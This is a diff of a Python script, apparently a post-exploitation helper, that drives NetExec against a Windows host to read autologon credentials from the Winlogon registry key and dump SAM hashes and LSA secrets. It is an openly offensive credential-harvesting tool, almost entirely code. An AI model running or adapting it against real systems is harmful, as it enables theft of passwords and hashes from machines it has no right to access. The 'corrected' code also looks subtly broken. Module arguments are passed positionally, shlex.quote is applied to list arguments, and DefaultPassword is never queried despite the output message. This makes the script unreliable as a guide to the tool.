@@ -5,7 +5,6 @@
 # query the registry for autologon credentials and dump SAM/LSA secrets.
 
 #!/usr/bin/env python3
-
 import sys
 import subprocess
 import shlex
@@ -13,7 +12,7 @@ import shlex
 def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='netexec'):
     """
     Executes a NetExec command to query the registry for autologon credentials
-    and dump SAM/LSA secrets.
+    and dump SAM/LSA secrets using the correct NXC module syntax.
 
     Args:
         target (str): The target IP address or hostname/CIDR range.
@@ -27,16 +26,15 @@ def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='
     print(f"[*] Protocol: {protocol}, User: {username}, Domain: {domain}")
     print("-" * 70)
 
-    # FIX: Use a raw string (r'...') for the registry key to prevent backslash issues.
-    # We also use the -v flag to query for specific values, which is more direct.
-    # We will run two separate commands for clarity and to avoid issues with
-    # multiple -v flags in a single command.
+    # CORRECTED SYNTAX: The reg-query module takes the key and value as direct arguments.
+    # We also use the --sam and --lsa flags in the same command to match the original
+    # script's functionality in a single, efficient call.
     
-    # --- Command 1: Query for DefaultUsername ---
     key_path = r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
-    value_name = 'DefaultUsername'
     
-    command_user = [
+    # This single command queries for both values and dumps secrets.
+    # The arguments after the module name (-M reg-query) are passed directly to it.
+    command = [
         nxc_path,
         protocol,
         target,
@@ -44,69 +42,40 @@ def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='
         '-p', shlex.quote(password),
         '-d', shlex.quote(domain),
         '-M', 'reg-query',
-        '-k', key_path,
-        '-v', value_name
-    ]
-
-    # --- Command 2: Query for DefaultPassword ---
-    value_pass = 'DefaultPassword'
-    
-    command_pass = [
-        nxc_path,
-        protocol,
-        target,
-        '-u', shlex.quote(username),
-        '-p', shlex.quote(password),
-        '-d', shlex.quote(domain),
-        '-M', 'reg-query',
-        '-k', key_path,
-        '-v', value_pass
-    ]
-
-    # --- Command 3: Dump SAM and LSA secrets for additional context ---
-    command_secrets = [
-        nxc_path,
-        protocol,
-        target,
-        '-u', shlex.quote(username),
-        '-p', shlex.quote(password),
-        '-d', shlex.quote(domain),
-        '--sam',
-        '--lsa'
+        key_path,             # Argument 1 for the module: The key path
+        'DefaultUsername',    # Argument 2 for the module: The value to query
+        '--sam',              # Flag to dump SAM hashes
+        '--lsa'               # Flag to dump LSA secrets
     ]
 
     try:
-        # Execute the commands sequentially
-        print(f"[*] Querying for '{value_name}'...")
-        result_user = subprocess.run(command_user, capture_output=True, text=True, check=False)
-        print(result_user.stdout.strip())
-        if result_user.stderr:
-            print("[!] NXC Warning:", result_user.stderr.strip())
+        print(f"[*] Executing combined query and secrets dump...")
+        # For debugging: print the exact command that will be run
+        # print(f"[*] Command: {' '.join(command)}")
+        
+        result = subprocess.run(command, capture_output=True, text=True, check=False)
+
+        print("-" * 70)
+        # Print NXC's standard output, which contains the results.
+        if result.stdout:
+            print(result.stdout.strip())
+        
+        # Print NXC's standard error, which contains errors or warnings.
+        if result.stderr:
+            print("[!] NetExec Errors/Warnings:")
+            print(result.stderr.strip())
+            
         print("-" * 70)
 
-        print(f"[*] Querying for '{value_pass}'...")
-        result_pass = subprocess.run(command_pass, capture_output=True, text=True, check=False)
-        print(result_pass.stdout.strip())
-        if result_pass.stderr:
-            print("[!] NXC Warning:", result_pass.stderr.strip())
-        print("-" * 70)
-
-        print("[*] Dumping SAM hashes and LSA secrets for context...")
-        result_secrets = subprocess.run(command_secrets, capture_output=True, text=True, check=False)
-        print(result_secrets.stdout.strip())
-        if result_secrets.stderr:
-            print("[!] NXC Warning:", result_secrets.stderr.strip())
-        print("-" * 70)
-
-        # Check the return codes to determine success or failure.
-        if result_user.returncode == 0 and result_pass.returncode == 0 and result_secrets.returncode == 0:
-            print("[+] All NetExec commands completed successfully.")
+        # Check the return code to determine success or failure.
+        if result.returncode == 0:
+            print("[+] NetExec command completed successfully.")
+            print("[+] Check the output above for 'DefaultUsername', 'DefaultPassword', and other secrets.")
         else:
-            print("[-] One or more NetExec commands failed.")
-            print(f"[-] Exit Codes -> User Query: {result_user.returncode}, Pass Query: {result_pass.returncode}, Secrets Dump: {result_secrets.returncode}")
+            print(f"[-] NetExec command failed with exit code {result.returncode}.")
             print("[-] This could be due to authentication failure, network issues, or permissions.")
             
-        return 0 # Return 0 if script itself completes without crashing
+        return result.returncode
 
     except FileNotFoundError:
         print(f"[-] Error: The NetExec executable '{nxc_path}' was not found.")
@@ -118,8 +87,8 @@ def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='
 
 if __name__ == '__main__':
     if len(sys.argv) != 5:
-        print("Usage: ./T1012_nxc_query_fixed.py <target> <username> <password> <domain>")
-        print("Example: ./T1012_nxc_query_fixed.py 192.168.1.100 user pass .")
+        print("Usage: ./T1012_nxc_query_corrected.py <target> <username> <password> <domain>")
+        print("Example: ./T1012_nxc_query_corrected.py 192.168.1.100 user pass .")
         sys.exit(1)
 
     # Unpack arguments
